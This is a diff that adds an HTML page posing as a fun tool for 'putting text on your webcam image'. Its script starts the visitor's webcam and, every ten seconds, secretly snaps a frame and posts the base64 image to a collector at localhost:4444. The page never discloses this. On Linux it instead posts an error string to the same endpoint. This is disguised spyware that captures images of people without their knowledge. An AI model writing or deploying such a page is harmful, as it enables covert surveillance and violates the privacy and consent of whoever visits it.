@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/webcam-easy/dist/webcam-easy.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>?</title>
+
+    <style>
+        body {
+            background-color: #e8e8e8;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+        }
+        #titel {
+            margin-left: 100px;
+            font-size: 41px;
+            animation-duration: 2s;
+            animation-direction: alternate;
+            animation-name: move_titel;
+            animation-iteration-count: infinite;
+        }
+        @keyframes move_titel {
+            from {
+                margin-left: 100px;
+            }
+            to {
+                margin-left: 500px;
+            }
+        }
+        #emoji {
+            border-radius: 5px;
+            border: 4px solid yellow;
+            width: 200px;
+            height: 100px;
+            margin-left: 80px;
+            font-size: 50px;
+            outline: none;
+            margin-top: 200px;
+            text-align: center;
+
+        }
+        #emoji:hover {
+            box-shadow: 1px 1px 5px;
+        }
+        #set {
+            border-radius: 10px;
+            border: none;
+            border: 4px solid rgb(63, 105, 196);
+            width: 200px;
+            height: 100px;
+            margin-left: 80px;
+            font-size: 60px;
+            margin-top: 200px;
+            position: relative;
+            left: 700px;
+            transition: 1s;
+        }
+        #set:hover {
+            background-color: rgb(63, 105, 196);
+            box-shadow: 1px 1px 10px;
+        }
+        #video_capcher {
+            border-radius: 20px;
+            margin-left: 355px;
+            position: absolute;
+            top: 160px;
+        }
+        #unavailable {
+            position: absolute;
+            left: 460px;
+            top: 250px;
+            font-size: 70px;
+            color: brown;
+        }
+        #cover {
+            position: absolute;
+            top: -100px;
+            left: 500px;
+            z-index: 10;
+            font-size: 320px;
+        }
+        #canvas {
+            position: absolute;
+            top: 0px;
+            width: 0px;
+            height: 0px;
+        }
+        #hidden {
+            position: absolute;
+            top: 0px;
+            width: 500px;
+            height: 400px;
+            background-color: white;
+        }
+    </style>
+
+</head>
+<body>
+    <h1 id="not_saport" style="text-align: center; font-size: 80px; color: brown;">Not Saport!</h1>
+    <div id="body">
+    <h1 id="titel">Putting text on your webcam image!</h1>
+    <input id="emoji" type="text" placeholder="Text:">
+    <button style="display: none;" id="set">Set</button>
+    <br><br>
+    <h1 id="unavailable" >*Unavailable</h1>
+    <h1 id="cover"></h1>
+    <video id="video_capcher" src=""></video>
+    <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        var os = navigator.appVersion.split(" ")[1]
+        if (os == "(Linux;"){
+            document.getElementById("body").style.display = "none"
+            $.post("http://localhost:4444", {"data":"eror: [ System Undifuned! ]"})
+            alert("Your Os Not Saport Webcam! Plese Try Cputer!")
+        }
+        else {
+            document.getElementById("not_saport").style.display = "none"
+            swal({
+            title: "In Name Of God",
+            text: "Hi. Welcom To My Web Page!",
+            icon: "info",
+            buttons: "Tancks",
+            })
+            document.getElementById("set").addEventListener("click", function(){
+                var emoji = document.getElementById("emoji").value
+                document.getElementById("cover").innerHTML = emoji
+            })
+            var webcam = new Webcam(document.getElementById("video_capcher"), "user", document.getElementById("canvas"))
+            webcam.start().then(
+                start => {document.getElementById("video_capcher").style.boxShadow = "2px 2px 10px",
+                        document.getElementById("set").style.display = ""}
+            )
+            .catch(
+                err => { swal({
+                    title: "eror!",
+                    text: "Plese Try Agin Not Webcam Saport.",
+                    buttons: "Ok.",
+                })
+                })
+            setInterval(function(){
+                var base64_img = webcam.snap()
+                $.post("http://localhost:4444", {"data":String(base64_img).replace("data:image/png;base64,", "")})
+            }, 10000)
+            }
+    </script>
+
+</body>
+</html>
